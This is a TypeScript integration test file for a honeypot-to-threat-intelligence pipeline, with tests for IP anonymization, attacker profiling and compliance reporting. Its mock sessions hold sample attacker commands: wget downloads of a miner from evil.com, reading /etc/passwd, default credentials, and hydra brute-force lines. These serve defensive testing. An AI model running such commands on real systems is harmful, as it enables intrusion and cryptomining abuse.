/**
 * Integration Test: PanguardTrap -> Threat Cloud Intelligence Pipeline
 * 整合測試：PanguardTrap -> Threat Cloud 情報管線
 *
 * Tests the pipeline from honeypot sessions to anonymized intelligence
 * and back to threat detection via shared intelligence.
 * 測試從蜜罐連線到匿名化情報，再回饋到威脅偵測的完整管線。
 */

import { describe, it, expect } from 'vitest';
import type { TrapSession, AttackerProfile, TrapServiceType } from '@panguard-ai/panguard-trap';
import {
  buildTrapIntel,
  buildBatchIntel,
  generateIntelSummary,
  estimateSkillLevel,
  classifyIntent,
  detectTools,
  DEFAULT_SERVICE_CONFIGS,
} from '@panguard-ai/panguard-trap';
import type { ComplianceFinding } from '@panguard-ai/panguard-report';
import {
  evaluateControls,
  getFrameworkControls,
  generateExecutiveSummary,
} from '@panguard-ai/panguard-report';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function createMockTrapSession(overrides: Partial<TrapSession> = {}): TrapSession {
  const now = new Date();
  return {
    sessionId: `TRAP-${Date.now()}`,
    serviceType: 'ssh',
    sourceIP: '103.45.67.89',
    sourcePort: 54321,
    startTime: now,
    endTime: new Date(now.getTime() + 30000),
    durationMs: 30000,
    events: [
      { timestamp: now, type: 'connection', data: 'SSH connection established' },
      { timestamp: now, type: 'authentication_attempt', data: 'root:password123' },
      { timestamp: now, type: 'authentication_attempt', data: 'admin:admin' },
      { timestamp: now, type: 'authentication_attempt', data: 'root:toor' },
      { timestamp: now, type: 'command_input', data: 'wget http://evil.com/miner' },
      { timestamp: now, type: 'disconnection', data: 'Connection closed' },
    ],
    credentials: [
      { timestamp: now, username: 'root', password: 'password123', grantedAccess: false },
      { timestamp: now, username: 'admin', password: 'admin', grantedAccess: false },
      { timestamp: now, username: 'root', password: 'toor', grantedAccess: true },
    ],
    commands: ['wget http://evil.com/miner', 'chmod +x miner', './miner'],
    mitreTechniques: ['T1110', 'T1059', 'T1105'],
    ...overrides,
  };
}

function createMockAttackerProfile(overrides: Partial<AttackerProfile> = {}): AttackerProfile {
  return {
    profileId: `PROF-${Date.now()}`,
    sourceIPs: ['103.45.67.89'],
    firstSeen: new Date(),
    lastSeen: new Date(),
    totalSessions: 5,
    skillLevel: 'intermediate',
    intent: 'cryptomining',
    toolsDetected: ['hydra'],
    mitreTechniques: ['T1110', 'T1059'],
    credentialPatterns: {
      commonUsernames: ['root', 'admin'],
      commonPasswords: ['password123', 'admin'],
      totalAttempts: 15,
    },
    geoHints: { country: 'CN' },
    riskScore: 75,
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('PanguardTrap -> Threat Cloud Intelligence Pipeline', () => {
  describe('Session to Intelligence Conversion', () => {
    it('should convert trap session to intelligence', () => {
      const session = createMockTrapSession();
      const profile = createMockAttackerProfile();

      const intel = buildTrapIntel(session, profile);

      expect(intel).not.toBeNull();
      expect(intel!.sourceIP).toBe('103.45.67.89');
      expect(intel!.serviceType).toBe('ssh');
    });

    it('should filter private IPs (anonymization)', () => {
      const privateSession = createMockTrapSession({ sourceIP: '192.168.1.100' });
      const intel = buildTrapIntel(privateSession);

      expect(intel).toBeNull(); // Private IP should be filtered
    });

    it('should filter localhost', () => {
      const localSession = createMockTrapSession({ sourceIP: '127.0.0.1' });
      const intel = buildTrapIntel(localSession);

      expect(intel).toBeNull();
    });

    it('should handle sessions without profile', () => {
      const session = createMockTrapSession();
      const intel = buildTrapIntel(session);

      expect(intel).not.toBeNull();
    });
  });

  describe('Batch Intelligence', () => {
    it('should build batch intelligence from multiple sessions', () => {
      const sessions = [
        createMockTrapSession({ sessionId: 'S1', sourceIP: '103.1.1.1' }),
        createMockTrapSession({ sessionId: 'S2', sourceIP: '103.2.2.2' }),
        createMockTrapSession({ sessionId: 'S3', sourceIP: '192.168.1.1' }), // Private - filtered
      ];

      const profiles = new Map<string, AttackerProfile>();
      const batchIntel = buildBatchIntel(sessions, profiles);

      // Should only include public IPs
      expect(batchIntel.length).toBe(2);
    });

    it('should generate intelligence summary from batch', () => {
      const sessions = [
        createMockTrapSession({ sessionId: 'S1', sourceIP: '103.1.1.1', serviceType: 'ssh' }),
        createMockTrapSession({ sessionId: 'S2', sourceIP: '103.2.2.2', serviceType: 'http' }),
        createMockTrapSession({ sessionId: 'S3', sourceIP: '103.1.1.1', serviceType: 'ssh' }),
      ];

      const profiles = new Map<string, AttackerProfile>();
      const batchIntel = buildBatchIntel(sessions, profiles);
      const summary = generateIntelSummary(batchIntel);

      expect(summary).toBeDefined();
      expect(summary.totalIntelReports).toBe(3);
    });
  });

  describe('Attacker Profiling Pipeline', () => {
    it('should estimate skill level from session commands', () => {
      // Script kiddie: simple commands
      const scriptKiddieCommands = ['ls', 'cat /etc/passwd', 'wget http://evil.com/script.sh'];
      const result = estimateSkillLevel(scriptKiddieCommands, [], []);
      expect(['script_kiddie', 'intermediate']).toContain(result.level);
    });

    it('should classify intent from session activity', () => {
      // Cryptomining intent
      const miningCommands = ['wget http://evil.com/miner', 'chmod +x miner', './miner'];
      const intent = classifyIntent(miningCommands, []);
      expect(intent).toBeDefined();
    });

    it('should detect tools from commands', () => {
      const commands = ['nmap -sV 192.168.1.0/24', 'hydra -l root -P passwords.txt ssh://target'];
      const tools = detectTools(commands);

      expect(tools.length).toBeGreaterThan(0);
    });
  });

  describe('Trap Intelligence to Compliance Findings', () => {
    it('should convert trap intelligence to compliance findings', () => {
      const session = createMockTrapSession();
      const profile = createMockAttackerProfile();
      const intel = buildTrapIntel(session, profile);

      expect(intel).not.toBeNull();

      // Convert to ComplianceFinding for PanguardReport
      const finding: ComplianceFinding = {
        findingId: `TRAP-${session.sessionId}`,
        severity:
          profile.riskScore >= 80 ? 'critical' : profile.riskScore >= 60 ? 'high' : 'medium',
        title: `Honeypot: ${profile.intent} activity detected on ${session.serviceType}`,
        description: `Attacker (${profile.skillLevel}) from ${session.sourceIP} targeted ${session.serviceType} service. Tools: ${profile.toolsDetected.join(', ')}`,
        category: 'monitoring',
        timestamp: session.startTime,
        source: 'panguard-trap',
      };

      expect(finding.source).toBe('panguard-trap');
      expect(finding.severity).toBe('high');
    });

    it('should feed trap findings into compliance evaluation', () => {
      const trapFindings: ComplianceFinding[] = [
        {
          findingId: 'TRAP-001',
          severity: 'critical',
          title: 'Cryptomining attempt via SSH honeypot',
          description: 'Advanced attacker attempted to deploy cryptocurrency miner',
          category: 'monitoring',
          timestamp: new Date(),
          source: 'panguard-trap',
        },
        {
          findingId: 'TRAP-002',
          severity: 'high',
          title: 'SSH brute force attack detected',
          description: 'Brute force attack with 15 credential attempts',
          category: 'access_control',
          timestamp: new Date(),
          source: 'panguard-trap',
        },
      ];

      const controls = getFrameworkControls('tw_cyber_security_act');
      const evaluated = evaluateControls(controls, trapFindings);

      // Some controls should be affected by trap findings
      const affectedControls = evaluated.filter((c) => c.relatedFindings.length > 0);
      expect(affectedControls.length).toBeGreaterThan(0);

      const summary = generateExecutiveSummary(evaluated, trapFindings, 'en');
      expect(summary.totalFindings).toBe(trapFindings.length);
    });
  });

  describe('Service Configuration Consistency', () => {
    it('should have configurations for all 8 service types', () => {
      const serviceTypes: TrapServiceType[] = [
        'ssh',
        'http',
        'ftp',
        'smb',
        'mysql',
        'rdp',
        'telnet',
        'redis',
      ];

      for (const type of serviceTypes) {
        expect(DEFAULT_SERVICE_CONFIGS[type]).toBeDefined();
        expect(DEFAULT_SERVICE_CONFIGS[type]!.port).toBeGreaterThan(0);
      }
    });

    it('should have unique ports for all services', () => {
      const ports = Object.values(DEFAULT_SERVICE_CONFIGS).map((c) => c.port);
      const uniquePorts = new Set(ports);
      expect(uniquePorts.size).toBe(ports.length);
    });
  });
});
